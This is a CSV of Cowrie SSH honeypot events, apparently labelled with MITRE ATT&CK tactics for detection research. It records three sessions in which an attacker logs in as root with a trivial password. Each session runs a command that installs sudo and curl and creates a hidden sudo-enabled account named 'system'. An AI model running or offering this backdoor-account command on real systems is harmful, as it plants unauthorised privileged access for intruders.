,event,session_id,session,labels
711,"{""dst_ip"": ""10.42.4.33"", ""dst_port"": 2222.0, ""eventid"": ""cowrie.session.connect"", ""message"": ""New connection: 10.42.4.1:42348 (10.42.4.33:2222) [session: bc5fdc2c998f]"", ""protocol"": ""ssh"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""src_ip"": ""10.42.4.1"", ""src_port"": 42348.0, ""timestamp"": ""2025-08-08T19:37:56.217300Z"", ""session_id"": ""bc5fdc2c998f""}",bc5fdc2c998f,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 rTc5gqKG) system  && sudo usermod -aG sudo system ; openssl passwd -1 rTc5gqKG;,"['Discovery', 'Persistence', 'Initial Access', 'Command and Control']"
712,"{""eventid"": ""cowrie.client.version"", ""message"": ""Remote SSH version: SSH-2.0-Go"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""src_ip"": ""10.42.4.1"", ""timestamp"": ""2025-08-08T19:37:56.217889Z"", ""version"": ""SSH-2.0-Go"", ""session_id"": ""bc5fdc2c998f""}",bc5fdc2c998f,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 rTc5gqKG) system  && sudo usermod -aG sudo system ; openssl passwd -1 rTc5gqKG;,"['Discovery', 'Persistence', 'Initial Access', 'Command and Control']"
713,"{""compCS"": [""none""], ""encCS"": [""aes128-gcm@openssh.com"", ""chacha20-poly1305@openssh.com"", ""aes128-ctr"", ""aes192-ctr"", ""aes256-ctr""], ""eventid"": ""cowrie.client.kex"", ""hash"": ""4e066189c3bbeec38c99b1855113733a"", ""hashAlgorithms"": ""curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,ext-info-c;aes128-gcm@openssh.com,chacha20-poly1305@openssh.com,aes128-ctr,aes192-ctr,aes256-ctr;hmac-sha2-256-etm@openssh.com,hmac-sha2-256,hmac-sha1,hmac-sha1-96;none"", ""kexAlgs"": [""curve25519-sha256"", ""curve25519-sha256@libssh.org"", ""ecdh-sha2-nistp256"", ""ecdh-sha2-nistp384"", ""ecdh-sha2-nistp521"", ""diffie-hellman-group14-sha256"", ""diffie-hellman-group14-sha1"", ""ext-info-c""], ""keyAlgs"": [""rsa-sha2-512-cert-v01@openssh.com"", ""rsa-sha2-256-cert-v01@openssh.com"", ""ssh-rsa-cert-v01@openssh.com"", ""ssh-dss-cert-v01@openssh.com"", ""ecdsa-sha2-nistp256-cert-v01@openssh.com"", ""ecdsa-sha2-nistp384-cert-v01@openssh.com"", ""ecdsa-sha2-nistp521-cert-v01@openssh.com"", ""ssh-ed25519-cert-v01@openssh.com"", ""ecdsa-sha2-nistp256"", ""ecdsa-sha2-nistp384"", ""ecdsa-sha2-nistp521"", ""rsa-sha2-512"", ""rsa-sha2-256"", ""ssh-rsa"", ""ssh-dss"", ""ssh-ed25519""], ""langCS"": [""""], ""macCS"": [""hmac-sha2-256-etm@openssh.com"", ""hmac-sha2-256"", ""hmac-sha1"", ""hmac-sha1-96""], ""message"": ""SSH client hassh fingerprint: 4e066189c3bbeec38c99b1855113733a"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""src_ip"": ""10.42.4.1"", ""timestamp"": ""2025-08-08T19:37:56.321398Z"", ""session_id"": ""bc5fdc2c998f""}",bc5fdc2c998f,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 rTc5gqKG) system  && sudo usermod -aG sudo system ; openssl passwd -1 rTc5gqKG;,"['Discovery', 'Persistence', 'Initial Access', 'Command and Control']"
714,"{""eventid"": ""cowrie.login.success"", ""message"": ""login attempt [root/0] succeeded"", ""password"": ""0"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""src_ip"": ""10.42.4.1"", ""timestamp"": ""2025-08-08T19:37:56.633881Z"", ""username"": ""root"", ""session_id"": ""bc5fdc2c998f""}",bc5fdc2c998f,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 rTc5gqKG) system  && sudo usermod -aG sudo system ; openssl passwd -1 rTc5gqKG;,"['Discovery', 'Persistence', 'Initial Access', 'Command and Control']"
715,"{""arch"": ""linux-x64-lsb"", ""eventid"": ""cowrie.session.params"", ""message"": ""[]"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""src_ip"": ""10.42.4.1"", ""timestamp"": ""2025-08-08T19:37:56.930943Z"", ""session_id"": ""bc5fdc2c998f""}",bc5fdc2c998f,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 rTc5gqKG) system  && sudo usermod -aG sudo system ; openssl passwd -1 rTc5gqKG;,"['Discovery', 'Persistence', 'Initial Access', 'Command and Control']"
716,"{""eventid"": ""cowrie.command.input"", ""input"": ""apt update && apt install sudo curl -y && sudo useradd -m -p $(openssl passwd -1 rTc5gqKG) system && sudo usermod -aG sudo system"", ""message"": ""CMD: apt update && apt install sudo curl -y && sudo useradd -m -p $(openssl passwd -1 rTc5gqKG) system && sudo usermod -aG sudo system"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""src_ip"": ""10.42.4.1"", ""timestamp"": ""2025-08-08T19:37:56.931310Z"", ""session_id"": ""bc5fdc2c998f""}",bc5fdc2c998f,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 rTc5gqKG) system  && sudo usermod -aG sudo system ; openssl passwd -1 rTc5gqKG;,"['Discovery', 'Persistence', 'Initial Access', 'Command and Control']"
717,"{""eventid"": ""cowrie.command.input"", ""input"": ""openssl passwd -1 rTc5gqKG"", ""message"": ""CMD: openssl passwd -1 rTc5gqKG"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""src_ip"": ""10.42.4.1"", ""timestamp"": ""2025-08-08T19:37:56.931748Z"", ""session_id"": ""bc5fdc2c998f""}",bc5fdc2c998f,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 rTc5gqKG) system  && sudo usermod -aG sudo system ; openssl passwd -1 rTc5gqKG;,"['Discovery', 'Persistence', 'Initial Access', 'Command and Control']"
718,"{""eventid"": ""cowrie.command.failed"", ""input"": ""openssl passwd -1 rTc5gqKG"", ""message"": ""Command not found: openssl passwd -1 rTc5gqKG"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""src_ip"": ""10.42.4.1"", ""timestamp"": ""2025-08-08T19:37:56.932342Z"", ""session_id"": ""bc5fdc2c998f""}",bc5fdc2c998f,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 rTc5gqKG) system  && sudo usermod -aG sudo system ; openssl passwd -1 rTc5gqKG;,"['Discovery', 'Persistence', 'Initial Access', 'Command and Control']"
719,"{""duplicate"": false, ""duration"": ""0.1"", ""eventid"": ""cowrie.log.closed"", ""message"": ""Closing TTY Log: var/lib/cowrie/tty/5dea9e89bc0e2257118d1910cde3bc398362572680010ff5b16824a337771eb0 after 0.1 seconds"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""shasum"": ""5dea9e89bc0e2257118d1910cde3bc398362572680010ff5b16824a337771eb0"", ""size"": 154.0, ""src_ip"": ""10.42.4.1"", ""timestamp"": ""2025-08-08T19:37:57.037822Z"", ""ttylog"": ""var/lib/cowrie/tty/5dea9e89bc0e2257118d1910cde3bc398362572680010ff5b16824a337771eb0"", ""session_id"": ""bc5fdc2c998f""}",bc5fdc2c998f,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 rTc5gqKG) system  && sudo usermod -aG sudo system ; openssl passwd -1 rTc5gqKG;,"['Discovery', 'Persistence', 'Initial Access', 'Command and Control']"
720,"{""duration"": ""0.8"", ""eventid"": ""cowrie.session.closed"", ""message"": ""Connection lost after 0.8 seconds"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""src_ip"": ""10.42.4.1"", ""timestamp"": ""2025-08-08T19:37:57.038693Z"", ""session_id"": ""bc5fdc2c998f""}",bc5fdc2c998f,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 rTc5gqKG) system  && sudo usermod -aG sudo system ; openssl passwd -1 rTc5gqKG;,"['Discovery', 'Persistence', 'Initial Access', 'Command and Control']"
721,"{""dst_ip"": ""10.42.6.15"", ""dst_port"": 2222.0, ""eventid"": ""cowrie.session.connect"", ""message"": ""New connection: 10.42.6.1:51846 (10.42.6.15:2222) [session: dd07bb956c56]"", ""protocol"": ""ssh"", ""sensor"": ""cowrie-poli-worker-01-89bfdd5dd-v7wvn"", ""src_ip"": ""10.42.6.1"", ""src_port"": 51846.0, ""timestamp"": ""2025-08-07T23:16:27.801051Z"", ""session_id"": ""dd07bb956c56""}",dd07bb956c56,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 qymahrCW) system  && sudo usermod -aG sudo system ; openssl passwd -1 qymahrCW;,"['Discovery', 'Persistence', 'Initial Access', 'Command and Control']"
722,"{""eventid"": ""cowrie.client.version"", ""message"": ""Remote SSH version: SSH-2.0-Go"", ""sensor"": ""cowrie-poli-worker-01-89bfdd5dd-v7wvn"", ""src_ip"": ""10.42.6.1"", ""timestamp"": ""2025-08-07T23:16:27.805931Z"", ""version"": ""SSH-2.0-Go"", ""session_id"": ""dd07bb956c56""}",dd07bb956c56,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 qymahrCW) system  && sudo usermod -aG sudo system ; openssl passwd -1 qymahrCW;,"['Discovery', 'Persistence', 'Initial Access', 'Command and Control']"
723,"{""compCS"": [""none""], ""encCS"": [""aes128-gcm@openssh.com"", ""chacha20-poly1305@openssh.com"", ""aes128-ctr"", ""aes192-ctr"", ""aes256-ctr""], ""eventid"": ""cowrie.client.kex"", ""hash"": ""4e066189c3bbeec38c99b1855113733a"", ""hashAlgorithms"": ""curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,ext-info-c;aes128-gcm@openssh.com,chacha20-poly1305@openssh.com,aes128-ctr,aes192-ctr,aes256-ctr;hmac-sha2-256-etm@openssh.com,hmac-sha2-256,hmac-sha1,hmac-sha1-96;none"", ""kexAlgs"": [""curve25519-sha256"", ""curve25519-sha256@libssh.org"", ""ecdh-sha2-nistp256"", ""ecdh-sha2-nistp384"", ""ecdh-sha2-nistp521"", ""diffie-hellman-group14-sha256"", ""diffie-hellman-group14-sha1"", ""ext-info-c""], ""keyAlgs"": [""rsa-sha2-512-cert-v01@openssh.com"", ""rsa-sha2-256-cert-v01@openssh.com"", ""ssh-rsa-cert-v01@openssh.com"", ""ssh-dss-cert-v01@openssh.com"", ""ecdsa-sha2-nistp256-cert-v01@openssh.com"", ""ecdsa-sha2-nistp384-cert-v01@openssh.com"", ""ecdsa-sha2-nistp521-cert-v01@openssh.com"", ""ssh-ed25519-cert-v01@openssh.com"", ""ecdsa-sha2-nistp256"", ""ecdsa-sha2-nistp384"", ""ecdsa-sha2-nistp521"", ""rsa-sha2-512"", ""rsa-sha2-256"", ""ssh-rsa"", ""ssh-dss"", ""ssh-ed25519""], ""langCS"": [""""], ""macCS"": [""hmac-sha2-256-etm@openssh.com"", ""hmac-sha2-256"", ""hmac-sha1"", ""hmac-sha1-96""], ""message"": ""SSH client hassh fingerprint: 4e066189c3bbeec38c99b1855113733a"", ""sensor"": ""cowrie-poli-worker-01-89bfdd5dd-v7wvn"", ""src_ip"": ""10.42.6.1"", ""timestamp"": ""2025-08-07T23:16:27.821868Z"", ""session_id"": ""dd07bb956c56""}",dd07bb956c56,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 qymahrCW) system  && sudo usermod -aG sudo system ; openssl passwd -1 qymahrCW;,"['Discovery', 'Persistence', 'Initial Access', 'Command and Control']"
724,"{""eventid"": ""cowrie.login.success"", ""message"": ""login attempt [root/0] succeeded"", ""password"": ""0"", ""sensor"": ""cowrie-poli-worker-01-89bfdd5dd-v7wvn"", ""src_ip"": ""10.42.6.1"", ""timestamp"": ""2025-08-07T23:16:27.899768Z"", ""username"": ""root"", ""session_id"": ""dd07bb956c56""}",dd07bb956c56,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 qymahrCW) system  && sudo usermod -aG sudo system ; openssl passwd -1 qymahrCW;,"['Discovery', 'Persistence', 'Initial Access', 'Command and Control']"
725,"{""arch"": ""linux-x64-lsb"", ""eventid"": ""cowrie.session.params"", ""message"": ""[]"", ""sensor"": ""cowrie-poli-worker-01-89bfdd5dd-v7wvn"", ""src_ip"": ""10.42.6.1"", ""timestamp"": ""2025-08-07T23:16:28.003997Z"", ""session_id"": ""dd07bb956c56""}",dd07bb956c56,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 qymahrCW) system  && sudo usermod -aG sudo system ; openssl passwd -1 qymahrCW;,"['Discovery', 'Persistence', 'Initial Access', 'Command and Control']"
726,"{""eventid"": ""cowrie.command.input"", ""input"": ""apt update && apt install sudo curl -y && sudo useradd -m -p $(openssl passwd -1 qymahrCW) system && sudo usermod -aG sudo system"", ""message"": ""CMD: apt update && apt install sudo curl -y && sudo useradd -m -p $(openssl passwd -1 qymahrCW) system && sudo usermod -aG sudo system"", ""sensor"": ""cowrie-poli-worker-01-89bfdd5dd-v7wvn"", ""src_ip"": ""10.42.6.1"", ""timestamp"": ""2025-08-07T23:16:28.005098Z"", ""session_id"": ""dd07bb956c56""}",dd07bb956c56,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 qymahrCW) system  && sudo usermod -aG sudo system ; openssl passwd -1 qymahrCW;,"['Discovery', 'Persistence', 'Initial Access', 'Command and Control']"
727,"{""eventid"": ""cowrie.command.input"", ""input"": ""openssl passwd -1 qymahrCW"", ""message"": ""CMD: openssl passwd -1 qymahrCW"", ""sensor"": ""cowrie-poli-worker-01-89bfdd5dd-v7wvn"", ""src_ip"": ""10.42.6.1"", ""timestamp"": ""2025-08-07T23:16:28.006289Z"", ""session_id"": ""dd07bb956c56""}",dd07bb956c56,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 qymahrCW) system  && sudo usermod -aG sudo system ; openssl passwd -1 qymahrCW;,"['Discovery', 'Persistence', 'Initial Access', 'Command and Control']"
728,"{""eventid"": ""cowrie.command.failed"", ""input"": ""openssl passwd -1 qymahrCW"", ""message"": ""Command not found: openssl passwd -1 qymahrCW"", ""sensor"": ""cowrie-poli-worker-01-89bfdd5dd-v7wvn"", ""src_ip"": ""10.42.6.1"", ""timestamp"": ""2025-08-07T23:16:28.007665Z"", ""session_id"": ""dd07bb956c56""}",dd07bb956c56,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 qymahrCW) system  && sudo usermod -aG sudo system ; openssl passwd -1 qymahrCW;,"['Discovery', 'Persistence', 'Initial Access', 'Command and Control']"
729,"{""duplicate"": false, ""duration"": ""0.0"", ""eventid"": ""cowrie.log.closed"", ""message"": ""Closing TTY Log: var/lib/cowrie/tty/674b46d8cbb34da1d2eaa2dbb19ed51687ebbe8439e7edd9a0dd3e0d4f493ba7 after 0.0 seconds"", ""sensor"": ""cowrie-poli-worker-01-89bfdd5dd-v7wvn"", ""shasum"": ""674b46d8cbb34da1d2eaa2dbb19ed51687ebbe8439e7edd9a0dd3e0d4f493ba7"", ""size"": 154.0, ""src_ip"": ""10.42.6.1"", ""timestamp"": ""2025-08-07T23:16:28.028960Z"", ""ttylog"": ""var/lib/cowrie/tty/674b46d8cbb34da1d2eaa2dbb19ed51687ebbe8439e7edd9a0dd3e0d4f493ba7"", ""session_id"": ""dd07bb956c56""}",dd07bb956c56,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 qymahrCW) system  && sudo usermod -aG sudo system ; openssl passwd -1 qymahrCW;,"['Discovery', 'Persistence', 'Initial Access', 'Command and Control']"
730,"{""duration"": ""0.2"", ""eventid"": ""cowrie.session.closed"", ""message"": ""Connection lost after 0.2 seconds"", ""sensor"": ""cowrie-poli-worker-01-89bfdd5dd-v7wvn"", ""src_ip"": ""10.42.6.1"", ""timestamp"": ""2025-08-07T23:16:28.029855Z"", ""session_id"": ""dd07bb956c56""}",dd07bb956c56,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 qymahrCW) system  && sudo usermod -aG sudo system ; openssl passwd -1 qymahrCW;,"['Discovery', 'Persistence', 'Initial Access', 'Command and Control']"
731,"{""dst_ip"": ""10.42.6.15"", ""dst_port"": 2222.0, ""eventid"": ""cowrie.session.connect"", ""message"": ""New connection: 10.42.6.1:39619 (10.42.6.15:2222) [session: f4cdb24b8a36]"", ""protocol"": ""ssh"", ""sensor"": ""cowrie-poli-worker-01-89bfdd5dd-v7wvn"", ""src_ip"": ""10.42.6.1"", ""src_port"": 39619.0, ""timestamp"": ""2025-08-11T19:33:22.701720Z"", ""session_id"": ""f4cdb24b8a36""}",f4cdb24b8a36,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 zsMwEYTu) system  && sudo usermod -aG sudo system ; openssl passwd -1 zsMwEYTu;,"['Discovery', 'Impact', 'Persistence', 'Initial Access', 'Command and Control']"
732,"{""eventid"": ""cowrie.client.version"", ""message"": ""Remote SSH version: SSH-2.0-Go"", ""sensor"": ""cowrie-poli-worker-01-89bfdd5dd-v7wvn"", ""src_ip"": ""10.42.6.1"", ""timestamp"": ""2025-08-11T19:33:22.702955Z"", ""version"": ""SSH-2.0-Go"", ""session_id"": ""f4cdb24b8a36""}",f4cdb24b8a36,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 zsMwEYTu) system  && sudo usermod -aG sudo system ; openssl passwd -1 zsMwEYTu;,"['Discovery', 'Impact', 'Persistence', 'Initial Access', 'Command and Control']"
733,"{""compCS"": [""none""], ""encCS"": [""aes128-gcm@openssh.com"", ""chacha20-poly1305@openssh.com"", ""aes128-ctr"", ""aes192-ctr"", ""aes256-ctr""], ""eventid"": ""cowrie.client.kex"", ""hash"": ""4e066189c3bbeec38c99b1855113733a"", ""hashAlgorithms"": ""curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,ext-info-c;aes128-gcm@openssh.com,chacha20-poly1305@openssh.com,aes128-ctr,aes192-ctr,aes256-ctr;hmac-sha2-256-etm@openssh.com,hmac-sha2-256,hmac-sha1,hmac-sha1-96;none"", ""kexAlgs"": [""curve25519-sha256"", ""curve25519-sha256@libssh.org"", ""ecdh-sha2-nistp256"", ""ecdh-sha2-nistp384"", ""ecdh-sha2-nistp521"", ""diffie-hellman-group14-sha256"", ""diffie-hellman-group14-sha1"", ""ext-info-c""], ""keyAlgs"": [""rsa-sha2-512-cert-v01@openssh.com"", ""rsa-sha2-256-cert-v01@openssh.com"", ""ssh-rsa-cert-v01@openssh.com"", ""ssh-dss-cert-v01@openssh.com"", ""ecdsa-sha2-nistp256-cert-v01@openssh.com"", ""ecdsa-sha2-nistp384-cert-v01@openssh.com"", ""ecdsa-sha2-nistp521-cert-v01@openssh.com"", ""ssh-ed25519-cert-v01@openssh.com"", ""ecdsa-sha2-nistp256"", ""ecdsa-sha2-nistp384"", ""ecdsa-sha2-nistp521"", ""rsa-sha2-512"", ""rsa-sha2-256"", ""ssh-rsa"", ""ssh-dss"", ""ssh-ed25519""], ""langCS"": [""""], ""macCS"": [""hmac-sha2-256-etm@openssh.com"", ""hmac-sha2-256"", ""hmac-sha1"", ""hmac-sha1-96""], ""message"": ""SSH client hassh fingerprint: 4e066189c3bbeec38c99b1855113733a"", ""sensor"": ""cowrie-poli-worker-01-89bfdd5dd-v7wvn"", ""src_ip"": ""10.42.6.1"", ""timestamp"": ""2025-08-11T19:33:22.722335Z"", ""session_id"": ""f4cdb24b8a36""}",f4cdb24b8a36,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 zsMwEYTu) system  && sudo usermod -aG sudo system ; openssl passwd -1 zsMwEYTu;,"['Discovery', 'Impact', 'Persistence', 'Initial Access', 'Command and Control']"
734,"{""eventid"": ""cowrie.login.success"", ""message"": ""login attempt [root/0] succeeded"", ""password"": ""0"", ""sensor"": ""cowrie-poli-worker-01-89bfdd5dd-v7wvn"", ""src_ip"": ""10.42.6.1"", ""timestamp"": ""2025-08-11T19:33:23.036236Z"", ""username"": ""root"", ""session_id"": ""f4cdb24b8a36""}",f4cdb24b8a36,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 zsMwEYTu) system  && sudo usermod -aG sudo system ; openssl passwd -1 zsMwEYTu;,"['Discovery', 'Impact', 'Persistence', 'Initial Access', 'Command and Control']"
735,"{""arch"": ""linux-x64-lsb"", ""eventid"": ""cowrie.session.params"", ""message"": ""[]"", ""sensor"": ""cowrie-poli-worker-01-89bfdd5dd-v7wvn"", ""src_ip"": ""10.42.6.1"", ""timestamp"": ""2025-08-11T19:33:23.130214Z"", ""session_id"": ""f4cdb24b8a36""}",f4cdb24b8a36,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 zsMwEYTu) system  && sudo usermod -aG sudo system ; openssl passwd -1 zsMwEYTu;,"['Discovery', 'Impact', 'Persistence', 'Initial Access', 'Command and Control']"
736,"{""eventid"": ""cowrie.command.input"", ""input"": ""apt update && apt install sudo curl -y && sudo useradd -m -p $(openssl passwd -1 zsMwEYTu) system && sudo usermod -aG sudo system"", ""message"": ""CMD: apt update && apt install sudo curl -y && sudo useradd -m -p $(openssl passwd -1 zsMwEYTu) system && sudo usermod -aG sudo system"", ""sensor"": ""cowrie-poli-worker-01-89bfdd5dd-v7wvn"", ""src_ip"": ""10.42.6.1"", ""timestamp"": ""2025-08-11T19:33:23.130822Z"", ""session_id"": ""f4cdb24b8a36""}",f4cdb24b8a36,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 zsMwEYTu) system  && sudo usermod -aG sudo system ; openssl passwd -1 zsMwEYTu;,"['Discovery', 'Impact', 'Persistence', 'Initial Access', 'Command and Control']"
737,"{""eventid"": ""cowrie.command.input"", ""input"": ""openssl passwd -1 zsMwEYTu"", ""message"": ""CMD: openssl passwd -1 zsMwEYTu"", ""sensor"": ""cowrie-poli-worker-01-89bfdd5dd-v7wvn"", ""src_ip"": ""10.42.6.1"", ""timestamp"": ""2025-08-11T19:33:23.131383Z"", ""session_id"": ""f4cdb24b8a36""}",f4cdb24b8a36,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 zsMwEYTu) system  && sudo usermod -aG sudo system ; openssl passwd -1 zsMwEYTu;,"['Discovery', 'Impact', 'Persistence', 'Initial Access', 'Command and Control']"
738,"{""eventid"": ""cowrie.command.failed"", ""input"": ""openssl passwd -1 zsMwEYTu"", ""message"": ""Command not found: openssl passwd -1 zsMwEYTu"", ""sensor"": ""cowrie-poli-worker-01-89bfdd5dd-v7wvn"", ""src_ip"": ""10.42.6.1"", ""timestamp"": ""2025-08-11T19:33:23.132376Z"", ""session_id"": ""f4cdb24b8a36""}",f4cdb24b8a36,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 zsMwEYTu) system  && sudo usermod -aG sudo system ; openssl passwd -1 zsMwEYTu;,"['Discovery', 'Impact', 'Persistence', 'Initial Access', 'Command and Control']"
739,"{""duplicate"": false, ""duration"": ""0.0"", ""eventid"": ""cowrie.log.closed"", ""message"": ""Closing TTY Log: var/lib/cowrie/tty/d45be0146235b39ffc0d438dfa03f3886ba25fc2cdb25d5f4003acbca093a484 after 0.0 seconds"", ""sensor"": ""cowrie-poli-worker-01-89bfdd5dd-v7wvn"", ""shasum"": ""d45be0146235b39ffc0d438dfa03f3886ba25fc2cdb25d5f4003acbca093a484"", ""size"": 154.0, ""src_ip"": ""10.42.6.1"", ""timestamp"": ""2025-08-11T19:33:23.153486Z"", ""ttylog"": ""var/lib/cowrie/tty/d45be0146235b39ffc0d438dfa03f3886ba25fc2cdb25d5f4003acbca093a484"", ""session_id"": ""f4cdb24b8a36""}",f4cdb24b8a36,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 zsMwEYTu) system  && sudo usermod -aG sudo system ; openssl passwd -1 zsMwEYTu;,"['Discovery', 'Impact', 'Persistence', 'Initial Access', 'Command and Control']"
